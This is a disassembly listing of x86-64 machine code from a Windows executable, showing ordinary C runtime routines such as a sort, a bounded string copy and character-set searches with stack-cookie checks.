   1400096ea:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1400096f0:	e8 ab bf ff ff       	call   0x1400056a0
   1400096f5:	83 c8 ff             	or     $0xffffffff,%eax
   1400096f8:	eb 03                	jmp    0x1400096fd
   1400096fa:	8b 41 18             	mov    0x18(%rcx),%eax
   1400096fd:	48 83 c4 28          	add    $0x28,%rsp
   140009701:	c3                   	ret
   140009702:	cc                   	int3
   140009703:	cc                   	int3
   140009704:	cc                   	int3
   140009705:	cc                   	int3
   140009706:	cc                   	int3
   140009707:	cc                   	int3
   140009708:	cc                   	int3
   140009709:	cc                   	int3
   14000970a:	cc                   	int3
   14000970b:	cc                   	int3
   14000970c:	cc                   	int3
   14000970d:	cc                   	int3
   14000970e:	cc                   	int3
   14000970f:	cc                   	int3
   140009710:	41 54                	push   %r12
   140009712:	41 55                	push   %r13
   140009714:	41 56                	push   %r14
   140009716:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   14000971d:	48 8b 05 04 d9 00 00 	mov    0xd904(%rip),%rax        # 0x140017028
   140009724:	48 33 c4             	xor    %rsp,%rax
   140009727:	48 89 84 24 10 04 00 	mov    %rax,0x410(%rsp)
   14000972e:	00 
   14000972f:	4d 8b e1             	mov    %r9,%r12
   140009732:	4d 8b f0             	mov    %r8,%r14
   140009735:	4c 8b e9             	mov    %rcx,%r13
   140009738:	48 85 c9             	test   %rcx,%rcx
   14000973b:	75 1a                	jne    0x140009757
   14000973d:	48 85 d2             	test   %rdx,%rdx
   140009740:	74 15                	je     0x140009757
   140009742:	e8 79 c0 ff ff       	call   0x1400057c0
   140009747:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000974d:	e8 4e bf ff ff       	call   0x1400056a0
   140009752:	e9 38 03 00 00       	jmp    0x140009a8f
   140009757:	4d 85 f6             	test   %r14,%r14
   14000975a:	74 e6                	je     0x140009742
   14000975c:	4d 85 e4             	test   %r12,%r12
   14000975f:	74 e1                	je     0x140009742
   140009761:	48 83 fa 02          	cmp    $0x2,%rdx
   140009765:	0f 82 24 03 00 00    	jb     0x140009a8f
   14000976b:	48 89 9c 24 48 04 00 	mov    %rbx,0x448(%rsp)
   140009772:	00 
   140009773:	48 89 ac 24 40 04 00 	mov    %rbp,0x440(%rsp)
   14000977a:	00 
   14000977b:	48 89 b4 24 38 04 00 	mov    %rsi,0x438(%rsp)
   140009782:	00 
   140009783:	48 89 bc 24 30 04 00 	mov    %rdi,0x430(%rsp)
   14000978a:	00 
   14000978b:	4c 89 bc 24 28 04 00 	mov    %r15,0x428(%rsp)
   140009792:	00 
   140009793:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
   140009797:	4d 0f af fe          	imul   %r14,%r15
   14000979b:	4c 03 f9             	add    %rcx,%r15
   14000979e:	33 c9                	xor    %ecx,%ecx
   1400097a0:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400097a5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   1400097ac:	00 00 00 00 
   1400097b0:	33 d2                	xor    %edx,%edx
   1400097b2:	49 8b c7             	mov    %r15,%rax
   1400097b5:	49 2b c5             	sub    %r13,%rax
   1400097b8:	49 f7 f6             	div    %r14
   1400097bb:	48 8d 58 01          	lea    0x1(%rax),%rbx
   1400097bf:	48 83 fb 08          	cmp    $0x8,%rbx
   1400097c3:	0f 87 8b 00 00 00    	ja     0x140009854
   1400097c9:	4d 3b fd             	cmp    %r13,%r15
   1400097cc:	76 65                	jbe    0x140009833
   1400097ce:	4b 8d 34 2e          	lea    (%r14,%r13,1),%rsi
   1400097d2:	49 8b dd             	mov    %r13,%rbx
   1400097d5:	48 8b fe             	mov    %rsi,%rdi
   1400097d8:	49 3b f7             	cmp    %r15,%rsi
   1400097db:	77 20                	ja     0x1400097fd
   1400097dd:	0f 1f 00             	nopl   (%rax)
   1400097e0:	48 8b d3             	mov    %rbx,%rdx
   1400097e3:	48 8b cf             	mov    %rdi,%rcx
   1400097e6:	49 8b c4             	mov    %r12,%rax
   1400097e9:	ff 15 49 4a 00 00    	call   *0x4a49(%rip)        # 0x14000e238
   1400097ef:	85 c0                	test   %eax,%eax
   1400097f1:	48 0f 4f df          	cmovg  %rdi,%rbx
   1400097f5:	49 03 fe             	add    %r14,%rdi
   1400097f8:	49 3b ff             	cmp    %r15,%rdi
   1400097fb:	76 e3                	jbe    0x1400097e0
   1400097fd:	4d 8b c6             	mov    %r14,%r8
   140009800:	49 8b d7             	mov    %r15,%rdx
   140009803:	49 3b df             	cmp    %r15,%rbx
   140009806:	74 1e                	je     0x140009826
   140009808:	49 2b df             	sub    %r15,%rbx
   14000980b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009810:	0f b6 02             	movzbl (%rdx),%eax
   140009813:	0f b6 0c 13          	movzbl (%rbx,%rdx,1),%ecx
   140009817:	88 04 13             	mov    %al,(%rbx,%rdx,1)
   14000981a:	88 0a                	mov    %cl,(%rdx)
   14000981c:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009820:	49 83 e8 01          	sub    $0x1,%r8
   140009824:	75 ea                	jne    0x140009810
   140009826:	4d 2b fe             	sub    %r14,%r15
   140009829:	4d 3b fd             	cmp    %r13,%r15
   14000982c:	77 a4                	ja     0x1400097d2
   14000982e:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009833:	48 83 e9 01          	sub    $0x1,%rcx
   140009837:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000983c:	0f 88 25 02 00 00    	js     0x140009a67
   140009842:	4c 8b 6c cc 30       	mov    0x30(%rsp,%rcx,8),%r13
   140009847:	4c 8b bc cc 20 02 00 	mov    0x220(%rsp,%rcx,8),%r15
   14000984e:	00 
   14000984f:	e9 5c ff ff ff       	jmp    0x1400097b0
   140009854:	48 d1 eb             	shr    $1,%rbx
   140009857:	49 8b cd             	mov    %r13,%rcx
   14000985a:	49 0f af de          	imul   %r14,%rbx
   14000985e:	49 8b c4             	mov    %r12,%rax
   140009861:	4a 8d 34 2b          	lea    (%rbx,%r13,1),%rsi
   140009865:	48 8b d6             	mov    %rsi,%rdx
   140009868:	ff 15 ca 49 00 00    	call   *0x49ca(%rip)        # 0x14000e238
   14000986e:	85 c0                	test   %eax,%eax
   140009870:	7e 29                	jle    0x14000989b
   140009872:	4d 8b ce             	mov    %r14,%r9
   140009875:	4c 8b c6             	mov    %rsi,%r8
   140009878:	4c 3b ee             	cmp    %rsi,%r13
   14000987b:	74 1e                	je     0x14000989b
   14000987d:	0f 1f 00             	nopl   (%rax)
   140009880:	41 0f b6 00          	movzbl (%r8),%eax
   140009884:	49 8b d0             	mov    %r8,%rdx
   140009887:	48 2b d3             	sub    %rbx,%rdx
   14000988a:	0f b6 0a             	movzbl (%rdx),%ecx
   14000988d:	88 02                	mov    %al,(%rdx)
   14000988f:	41 88 08             	mov    %cl,(%r8)
   140009892:	49 ff c0             	inc    %r8
   140009895:	49 83 e9 01          	sub    $0x1,%r9
   140009899:	75 e5                	jne    0x140009880
   14000989b:	49 8b d7             	mov    %r15,%rdx
   14000989e:	49 8b cd             	mov    %r13,%rcx
   1400098a1:	49 8b c4             	mov    %r12,%rax
   1400098a4:	ff 15 8e 49 00 00    	call   *0x498e(%rip)        # 0x14000e238
   1400098aa:	85 c0                	test   %eax,%eax
   1400098ac:	7e 2a                	jle    0x1400098d8
   1400098ae:	4d 8b c6             	mov    %r14,%r8
   1400098b1:	49 8b d7             	mov    %r15,%rdx
   1400098b4:	4d 3b ef             	cmp    %r15,%r13
   1400098b7:	74 1f                	je     0x1400098d8
   1400098b9:	4d 8b cd             	mov    %r13,%r9
   1400098bc:	4d 2b cf             	sub    %r15,%r9
   1400098bf:	90                   	nop
   1400098c0:	0f b6 02             	movzbl (%rdx),%eax
   1400098c3:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   1400098c8:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   1400098cc:	88 0a                	mov    %cl,(%rdx)
   1400098ce:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1400098d2:	49 83 e8 01          	sub    $0x1,%r8
   1400098d6:	75 e8                	jne    0x1400098c0
   1400098d8:	49 8b d7             	mov    %r15,%rdx
   1400098db:	48 8b ce             	mov    %rsi,%rcx
   1400098de:	49 8b c4             	mov    %r12,%rax
   1400098e1:	ff 15 51 49 00 00    	call   *0x4951(%rip)        # 0x14000e238
   1400098e7:	85 c0                	test   %eax,%eax
   1400098e9:	7e 2d                	jle    0x140009918
   1400098eb:	4d 8b c6             	mov    %r14,%r8
   1400098ee:	49 8b d7             	mov    %r15,%rdx
   1400098f1:	49 3b f7             	cmp    %r15,%rsi
   1400098f4:	74 22                	je     0x140009918
   1400098f6:	4c 8b ce             	mov    %rsi,%r9
   1400098f9:	4d 2b cf             	sub    %r15,%r9
   1400098fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140009900:	0f b6 02             	movzbl (%rdx),%eax
   140009903:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009908:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000990c:	88 0a                	mov    %cl,(%rdx)
   14000990e:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140009912:	49 83 e8 01          	sub    $0x1,%r8
   140009916:	75 e8                	jne    0x140009900
   140009918:	49 8b dd             	mov    %r13,%rbx
   14000991b:	49 8b ff             	mov    %r15,%rdi
   14000991e:	66 90                	xchg   %ax,%ax
   140009920:	48 3b f3             	cmp    %rbx,%rsi
   140009923:	76 1d                	jbe    0x140009942
   140009925:	49 03 de             	add    %r14,%rbx
   140009928:	48 3b de             	cmp    %rsi,%rbx
   14000992b:	73 15                	jae    0x140009942
   14000992d:	48 8b d6             	mov    %rsi,%rdx
   140009930:	48 8b cb             	mov    %rbx,%rcx
   140009933:	49 8b c4             	mov    %r12,%rax
   140009936:	ff 15 fc 48 00 00    	call   *0x48fc(%rip)        # 0x14000e238
   14000993c:	85 c0                	test   %eax,%eax
   14000993e:	7e e5                	jle    0x140009925
   140009940:	eb 1e                	jmp    0x140009960
   140009942:	49 03 de             	add    %r14,%rbx
   140009945:	49 3b df             	cmp    %r15,%rbx
   140009948:	77 16                	ja     0x140009960
   14000994a:	48 8b d6             	mov    %rsi,%rdx
   14000994d:	48 8b cb             	mov    %rbx,%rcx
   140009950:	49 8b c4             	mov    %r12,%rax
   140009953:	ff 15 df 48 00 00    	call   *0x48df(%rip)        # 0x14000e238
   140009959:	85 c0                	test   %eax,%eax
   14000995b:	7e e5                	jle    0x140009942
   14000995d:	0f 1f 00             	nopl   (%rax)
   140009960:	48 8b ef             	mov    %rdi,%rbp
   140009963:	49 2b fe             	sub    %r14,%rdi
   140009966:	48 3b fe             	cmp    %rsi,%rdi
   140009969:	76 13                	jbe    0x14000997e
   14000996b:	48 8b d6             	mov    %rsi,%rdx
   14000996e:	48 8b cf             	mov    %rdi,%rcx
   140009971:	49 8b c4             	mov    %r12,%rax
   140009974:	ff 15 be 48 00 00    	call   *0x48be(%rip)        # 0x14000e238
   14000997a:	85 c0                	test   %eax,%eax
   14000997c:	7f e2                	jg     0x140009960
   14000997e:	48 3b fb             	cmp    %rbx,%rdi
   140009981:	72 38                	jb     0x1400099bb
   140009983:	4d 8b c6             	mov    %r14,%r8
   140009986:	48 8b d7             	mov    %rdi,%rdx
   140009989:	74 1e                	je     0x1400099a9
   14000998b:	4c 8b cb             	mov    %rbx,%r9
   14000998e:	4c 2b cf             	sub    %rdi,%r9
   140009991:	0f b6 02             	movzbl (%rdx),%eax
   140009994:	41 0f b6 0c 11       	movzbl (%r9,%rdx,1),%ecx
   140009999:	41 88 04 11          	mov    %al,(%r9,%rdx,1)
   14000999d:	88 0a                	mov    %cl,(%rdx)
   14000999f:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   1400099a3:	49 83 e8 01          	sub    $0x1,%r8
   1400099a7:	75 e8                	jne    0x140009991
   1400099a9:	48 3b f7             	cmp    %rdi,%rsi
   1400099ac:	48 8b c3             	mov    %rbx,%rax
   1400099af:	48 0f 45 c6          	cmovne %rsi,%rax
   1400099b3:	48 8b f0             	mov    %rax,%rsi
   1400099b6:	e9 65 ff ff ff       	jmp    0x140009920
   1400099bb:	48 3b f5             	cmp    %rbp,%rsi
   1400099be:	73 20                	jae    0x1400099e0
   1400099c0:	49 2b ee             	sub    %r14,%rbp
   1400099c3:	48 3b ee             	cmp    %rsi,%rbp
   1400099c6:	76 18                	jbe    0x1400099e0
   1400099c8:	48 8b d6             	mov    %rsi,%rdx
   1400099cb:	48 8b cd             	mov    %rbp,%rcx
   1400099ce:	49 8b c4             	mov    %r12,%rax
   1400099d1:	ff 15 61 48 00 00    	call   *0x4861(%rip)        # 0x14000e238
   1400099d7:	85 c0                	test   %eax,%eax
   1400099d9:	74 e5                	je     0x1400099c0
   1400099db:	eb 1e                	jmp    0x1400099fb
   1400099dd:	0f 1f 00             	nopl   (%rax)
   1400099e0:	49 2b ee             	sub    %r14,%rbp
   1400099e3:	49 3b ed             	cmp    %r13,%rbp
   1400099e6:	76 13                	jbe    0x1400099fb
   1400099e8:	48 8b d6             	mov    %rsi,%rdx
   1400099eb:	48 8b cd             	mov    %rbp,%rcx
   1400099ee:	49 8b c4             	mov    %r12,%rax
   1400099f1:	ff 15 41 48 00 00    	call   *0x4841(%rip)        # 0x14000e238
   1400099f7:	85 c0                	test   %eax,%eax
   1400099f9:	74 e5                	je     0x1400099e0
   1400099fb:	49 8b cf             	mov    %r15,%rcx
   1400099fe:	48 8b c5             	mov    %rbp,%rax
   140009a01:	48 2b cb             	sub    %rbx,%rcx
   140009a04:	49 2b c5             	sub    %r13,%rax
   140009a07:	48 3b c1             	cmp    %rcx,%rax
   140009a0a:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140009a0f:	7c 2b                	jl     0x140009a3c
   140009a11:	4c 3b ed             	cmp    %rbp,%r13
   140009a14:	73 15                	jae    0x140009a2b
   140009a16:	4c 89 6c cc 30       	mov    %r13,0x30(%rsp,%rcx,8)
   140009a1b:	48 89 ac cc 20 02 00 	mov    %rbp,0x220(%rsp,%rcx,8)
   140009a22:	00 
   140009a23:	48 ff c1             	inc    %rcx
   140009a26:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009a2b:	49 3b df             	cmp    %r15,%rbx
   140009a2e:	0f 83 ff fd ff ff    	jae    0x140009833
   140009a34:	4c 8b eb             	mov    %rbx,%r13
   140009a37:	e9 74 fd ff ff       	jmp    0x1400097b0
   140009a3c:	49 3b df             	cmp    %r15,%rbx
   140009a3f:	73 15                	jae    0x140009a56
   140009a41:	48 89 5c cc 30       	mov    %rbx,0x30(%rsp,%rcx,8)
   140009a46:	4c 89 bc cc 20 02 00 	mov    %r15,0x220(%rsp,%rcx,8)
   140009a4d:	00 
   140009a4e:	48 ff c1             	inc    %rcx
   140009a51:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140009a56:	4c 3b ed             	cmp    %rbp,%r13
   140009a59:	0f 83 d4 fd ff ff    	jae    0x140009833
   140009a5f:	4c 8b fd             	mov    %rbp,%r15
   140009a62:	e9 49 fd ff ff       	jmp    0x1400097b0
   140009a67:	48 8b bc 24 30 04 00 	mov    0x430(%rsp),%rdi
   140009a6e:	00 
   140009a6f:	48 8b b4 24 38 04 00 	mov    0x438(%rsp),%rsi
   140009a76:	00 
   140009a77:	48 8b ac 24 40 04 00 	mov    0x440(%rsp),%rbp
   140009a7e:	00 
   140009a7f:	48 8b 9c 24 48 04 00 	mov    0x448(%rsp),%rbx
   140009a86:	00 
   140009a87:	4c 8b bc 24 28 04 00 	mov    0x428(%rsp),%r15
   140009a8e:	00 
   140009a8f:	48 8b 8c 24 10 04 00 	mov    0x410(%rsp),%rcx
   140009a96:	00 
   140009a97:	48 33 cc             	xor    %rsp,%rcx
   140009a9a:	e8 51 39 00 00       	call   0x14000d3f0
   140009a9f:	48 81 c4 50 04 00 00 	add    $0x450,%rsp
   140009aa6:	41 5e                	pop    %r14
   140009aa8:	41 5d                	pop    %r13
   140009aaa:	41 5c                	pop    %r12
   140009aac:	c3                   	ret
   140009aad:	cc                   	int3
   140009aae:	cc                   	int3
   140009aaf:	cc                   	int3
   140009ab0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009ab5:	57                   	push   %rdi
   140009ab6:	48 83 ec 20          	sub    $0x20,%rsp
   140009aba:	45 33 d2             	xor    %r10d,%r10d
   140009abd:	49 8b d8             	mov    %r8,%rbx
   140009ac0:	4c 8b da             	mov    %rdx,%r11
   140009ac3:	4d 85 c9             	test   %r9,%r9
   140009ac6:	75 2c                	jne    0x140009af4
   140009ac8:	48 85 c9             	test   %rcx,%rcx
   140009acb:	75 2c                	jne    0x140009af9
   140009acd:	48 85 d2             	test   %rdx,%rdx
   140009ad0:	74 14                	je     0x140009ae6
   140009ad2:	e8 e9 bc ff ff       	call   0x1400057c0
   140009ad7:	bb 16 00 00 00       	mov    $0x16,%ebx
   140009adc:	89 18                	mov    %ebx,(%rax)
   140009ade:	e8 bd bb ff ff       	call   0x1400056a0
   140009ae3:	44 8b d3             	mov    %ebx,%r10d
   140009ae6:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009aeb:	41 8b c2             	mov    %r10d,%eax
   140009aee:	48 83 c4 20          	add    $0x20,%rsp
   140009af2:	5f                   	pop    %rdi
   140009af3:	c3                   	ret
   140009af4:	48 85 c9             	test   %rcx,%rcx
   140009af7:	74 d9                	je     0x140009ad2
   140009af9:	4d 85 db             	test   %r11,%r11
   140009afc:	74 d4                	je     0x140009ad2
   140009afe:	4d 85 c9             	test   %r9,%r9
   140009b01:	75 05                	jne    0x140009b08
   140009b03:	44 88 11             	mov    %r10b,(%rcx)
   140009b06:	eb de                	jmp    0x140009ae6
   140009b08:	48 85 db             	test   %rbx,%rbx
   140009b0b:	75 05                	jne    0x140009b12
   140009b0d:	44 88 11             	mov    %r10b,(%rcx)
   140009b10:	eb c0                	jmp    0x140009ad2
   140009b12:	48 2b d9             	sub    %rcx,%rbx
   140009b15:	48 8b d1             	mov    %rcx,%rdx
   140009b18:	4d 8b c3             	mov    %r11,%r8
   140009b1b:	49 8b f9             	mov    %r9,%rdi
   140009b1e:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140009b22:	75 14                	jne    0x140009b38
   140009b24:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   140009b27:	88 02                	mov    %al,(%rdx)
   140009b29:	48 ff c2             	inc    %rdx
   140009b2c:	84 c0                	test   %al,%al
   140009b2e:	74 28                	je     0x140009b58
   140009b30:	49 83 e8 01          	sub    $0x1,%r8
   140009b34:	75 ee                	jne    0x140009b24
   140009b36:	eb 20                	jmp    0x140009b58
   140009b38:	8a 04 13             	mov    (%rbx,%rdx,1),%al
   140009b3b:	88 02                	mov    %al,(%rdx)
   140009b3d:	48 ff c2             	inc    %rdx
   140009b40:	84 c0                	test   %al,%al
   140009b42:	74 0c                	je     0x140009b50
   140009b44:	49 83 e8 01          	sub    $0x1,%r8
   140009b48:	74 06                	je     0x140009b50
   140009b4a:	48 83 ef 01          	sub    $0x1,%rdi
   140009b4e:	75 e8                	jne    0x140009b38
   140009b50:	48 85 ff             	test   %rdi,%rdi
   140009b53:	75 03                	jne    0x140009b58
   140009b55:	44 88 12             	mov    %r10b,(%rdx)
   140009b58:	4d 85 c0             	test   %r8,%r8
   140009b5b:	75 89                	jne    0x140009ae6
   140009b5d:	49 83 f9 ff          	cmp    $0xffffffffffffffff,%r9
   140009b61:	75 0e                	jne    0x140009b71
   140009b63:	46 88 54 19 ff       	mov    %r10b,-0x1(%rcx,%r11,1)
   140009b68:	45 8d 50 50          	lea    0x50(%r8),%r10d
   140009b6c:	e9 75 ff ff ff       	jmp    0x140009ae6
   140009b71:	44 88 11             	mov    %r10b,(%rcx)
   140009b74:	e8 47 bc ff ff       	call   0x1400057c0
   140009b79:	bb 22 00 00 00       	mov    $0x22,%ebx
   140009b7e:	e9 59 ff ff ff       	jmp    0x140009adc
   140009b83:	cc                   	int3
   140009b84:	48 83 ec 58          	sub    $0x58,%rsp
   140009b88:	48 8b 05 99 d4 00 00 	mov    0xd499(%rip),%rax        # 0x140017028
   140009b8f:	48 33 c4             	xor    %rsp,%rax
   140009b92:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140009b97:	33 c0                	xor    %eax,%eax
   140009b99:	4c 8b ca             	mov    %rdx,%r9
   140009b9c:	48 83 f8 20          	cmp    $0x20,%rax
   140009ba0:	4c 8b c1             	mov    %rcx,%r8
   140009ba3:	73 77                	jae    0x140009c1c
   140009ba5:	c6 44 04 20 00       	movb   $0x0,0x20(%rsp,%rax,1)
   140009baa:	48 ff c0             	inc    %rax
   140009bad:	48 83 f8 20          	cmp    $0x20,%rax
   140009bb1:	7c f0                	jl     0x140009ba3
   140009bb3:	8a 02                	mov    (%rdx),%al
   140009bb5:	eb 1f                	jmp    0x140009bd6
   140009bb7:	0f b6 d0             	movzbl %al,%edx
   140009bba:	48 c1 ea 03          	shr    $0x3,%rdx
   140009bbe:	0f b6 c0             	movzbl %al,%eax
   140009bc1:	83 e0 07             	and    $0x7,%eax
   140009bc4:	0f b6 4c 14 20       	movzbl 0x20(%rsp,%rdx,1),%ecx
   140009bc9:	0f ab c1             	bts    %eax,%ecx
   140009bcc:	49 ff c1             	inc    %r9
   140009bcf:	88 4c 14 20          	mov    %cl,0x20(%rsp,%rdx,1)
   140009bd3:	41 8a 01             	mov    (%r9),%al
   140009bd6:	84 c0                	test   %al,%al
   140009bd8:	75 dd                	jne    0x140009bb7
   140009bda:	eb 1f                	jmp    0x140009bfb
   140009bdc:	41 0f b6 c1          	movzbl %r9b,%eax
   140009be0:	ba 01 00 00 00       	mov    $0x1,%edx
   140009be5:	41 0f b6 c9          	movzbl %r9b,%ecx
   140009be9:	83 e1 07             	and    $0x7,%ecx
   140009bec:	48 c1 e8 03          	shr    $0x3,%rax
   140009bf0:	d3 e2                	shl    %cl,%edx
   140009bf2:	84 54 04 20          	test   %dl,0x20(%rsp,%rax,1)
   140009bf6:	75 1f                	jne    0x140009c17
   140009bf8:	49 ff c0             	inc    %r8
   140009bfb:	45 8a 08             	mov    (%r8),%r9b
   140009bfe:	45 84 c9             	test   %r9b,%r9b
   140009c01:	75 d9                	jne    0x140009bdc
   140009c03:	33 c0                	xor    %eax,%eax
   140009c05:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   140009c0a:	48 33 cc             	xor    %rsp,%rcx
   140009c0d:	e8 de 37 00 00       	call   0x14000d3f0
   140009c12:	48 83 c4 58          	add    $0x58,%rsp
   140009c16:	c3                   	ret
   140009c17:	49 8b c0             	mov    %r8,%rax
   140009c1a:	eb e9                	jmp    0x140009c05
   140009c1c:	e8 c7 39 00 00       	call   0x14000d5e8
   140009c21:	cc                   	int3
   140009c22:	cc                   	int3
   140009c23:	cc                   	int3
   140009c24:	cc                   	int3
   140009c25:	cc                   	int3
   140009c26:	cc                   	int3
   140009c27:	cc                   	int3
   140009c28:	cc                   	int3
   140009c29:	cc                   	int3
   140009c2a:	cc                   	int3
   140009c2b:	cc                   	int3
   140009c2c:	cc                   	int3
   140009c2d:	cc                   	int3
   140009c2e:	cc                   	int3
   140009c2f:	cc                   	int3
   140009c30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009c35:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009c3a:	57                   	push   %rdi
   140009c3b:	4c 8b d2             	mov    %rdx,%r10
   140009c3e:	48 8d 35 bb 63 ff ff 	lea    -0x9c45(%rip),%rsi        # 0x140000000
   140009c45:	41 83 e2 0f          	and    $0xf,%r10d
   140009c49:	48 8b fa             	mov    %rdx,%rdi
   140009c4c:	49 2b fa             	sub    %r10,%rdi
   140009c4f:	48 8b da             	mov    %rdx,%rbx
   140009c52:	4c 8b c1             	mov    %rcx,%r8
   140009c55:	0f 57 db             	xorps  %xmm3,%xmm3
   140009c58:	49 8d 42 ff          	lea    -0x1(%r10),%rax
   140009c5c:	f3 0f 6f 0f          	movdqu (%rdi),%xmm1
   140009c60:	48 83 f8 0e          	cmp    $0xe,%rax
   140009c64:	77 73                	ja     0x140009cd9
   140009c66:	8b 84 86 3c 9f 00 00 	mov    0x9f3c(%rsi,%rax,4),%eax
   140009c6d:	48 03 c6             	add    %rsi,%rax
   140009c70:	ff e0                	jmp    *%rax
   140009c72:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   140009c77:	eb 60                	jmp    0x140009cd9
   140009c79:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   140009c7e:	eb 59                	jmp    0x140009cd9
   140009c80:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   140009c85:	eb 52                	jmp    0x140009cd9
   140009c87:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   140009c8c:	eb 4b                	jmp    0x140009cd9
   140009c8e:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   140009c93:	eb 44                	jmp    0x140009cd9
   140009c95:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   140009c9a:	eb 3d                	jmp    0x140009cd9
   140009c9c:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   140009ca1:	eb 36                	jmp    0x140009cd9
   140009ca3:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   140009ca8:	eb 2f                	jmp    0x140009cd9
   140009caa:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   140009caf:	eb 28                	jmp    0x140009cd9
   140009cb1:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   140009cb6:	eb 21                	jmp    0x140009cd9
   140009cb8:	66 0f 73 d9 0b       	psrldq $0xb,%xmm1
   140009cbd:	eb 1a                	jmp    0x140009cd9
   140009cbf:	66 0f 73 d9 0c       	psrldq $0xc,%xmm1
   140009cc4:	eb 13                	jmp    0x140009cd9
   140009cc6:	66 0f 73 d9 0d       	psrldq $0xd,%xmm1
   140009ccb:	eb 0c                	jmp    0x140009cd9
   140009ccd:	66 0f 73 d9 0e       	psrldq $0xe,%xmm1
   140009cd2:	eb 05                	jmp    0x140009cd9
   140009cd4:	66 0f 73 d9 0f       	psrldq $0xf,%xmm1
   140009cd9:	0f 57 c0             	xorps  %xmm0,%xmm0
   140009cdc:	41 b9 0f 00 00 00    	mov    $0xf,%r9d
   140009ce2:	66 0f 74 c1          	pcmpeqb %xmm1,%xmm0
   140009ce6:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140009cea:	85 c0                	test   %eax,%eax
   140009cec:	0f 84 33 01 00 00    	je     0x140009e25
   140009cf2:	0f bc d0             	bsf    %eax,%edx
   140009cf5:	4d 85 d2             	test   %r10,%r10
   140009cf8:	75 06                	jne    0x140009d00
   140009cfa:	45 8d 59 f2          	lea    -0xe(%r9),%r11d
   140009cfe:	eb 14                	jmp    0x140009d14
   140009d00:	45 33 db             	xor    %r11d,%r11d
   140009d03:	8b c2                	mov    %edx,%eax
   140009d05:	b9 10 00 00 00       	mov    $0x10,%ecx
   140009d0a:	49 2b ca             	sub    %r10,%rcx
   140009d0d:	48 3b c1             	cmp    %rcx,%rax
   140009d10:	41 0f 92 c3          	setb   %r11b
   140009d14:	41 8b c1             	mov    %r9d,%eax
   140009d17:	2b c2                	sub    %edx,%eax
   140009d19:	41 3b c1             	cmp    %r9d,%eax
   140009d1c:	0f 87 cf 00 00 00    	ja     0x140009df1
   140009d22:	8b 8c 86 78 9f 00 00 	mov    0x9f78(%rsi,%rax,4),%ecx
   140009d29:	48 03 ce             	add    %rsi,%rcx
   140009d2c:	ff e1                	jmp    *%rcx
   140009d2e:	66 0f 73 f9 01       	pslldq $0x1,%xmm1
   140009d33:	66 0f 73 d9 01       	psrldq $0x1,%xmm1
   140009d38:	e9 b4 00 00 00       	jmp    0x140009df1
   140009d3d:	66 0f 73 f9 02       	pslldq $0x2,%xmm1
   140009d42:	66 0f 73 d9 02       	psrldq $0x2,%xmm1
   140009d47:	e9 a5 00 00 00       	jmp    0x140009df1
   140009d4c:	66 0f 73 f9 03       	pslldq $0x3,%xmm1
   140009d51:	66 0f 73 d9 03       	psrldq $0x3,%xmm1
   140009d56:	e9 96 00 00 00       	jmp    0x140009df1
   140009d5b:	66 0f 73 f9 04       	pslldq $0x4,%xmm1
   140009d60:	66 0f 73 d9 04       	psrldq $0x4,%xmm1
   140009d65:	e9 87 00 00 00       	jmp    0x140009df1
   140009d6a:	66 0f 73 f9 05       	pslldq $0x5,%xmm1
   140009d6f:	66 0f 73 d9 05       	psrldq $0x5,%xmm1
   140009d74:	eb 7b                	jmp    0x140009df1
   140009d76:	66 0f 73 f9 06       	pslldq $0x6,%xmm1
   140009d7b:	66 0f 73 d9 06       	psrldq $0x6,%xmm1
   140009d80:	eb 6f                	jmp    0x140009df1
   140009d82:	66 0f 73 f9 07       	pslldq $0x7,%xmm1
   140009d87:	66 0f 73 d9 07       	psrldq $0x7,%xmm1
   140009d8c:	eb 63                	jmp    0x140009df1
   140009d8e:	66 0f 73 f9 08       	pslldq $0x8,%xmm1
   140009d93:	66 0f 73 d9 08       	psrldq $0x8,%xmm1
   140009d98:	eb 57                	jmp    0x140009df1
   140009d9a:	66 0f 73 f9 09       	pslldq $0x9,%xmm1
   140009d9f:	66 0f 73 d9 09       	psrldq $0x9,%xmm1
   140009da4:	eb 4b                	jmp    0x140009df1
   140009da6:	66 0f 73 f9 0a       	pslldq $0xa,%xmm1
   140009dab:	66 0f 73 d9 0a       	psrldq $0xa,%xmm1
   140009db0:	eb 3f                	jmp    0x140009df1
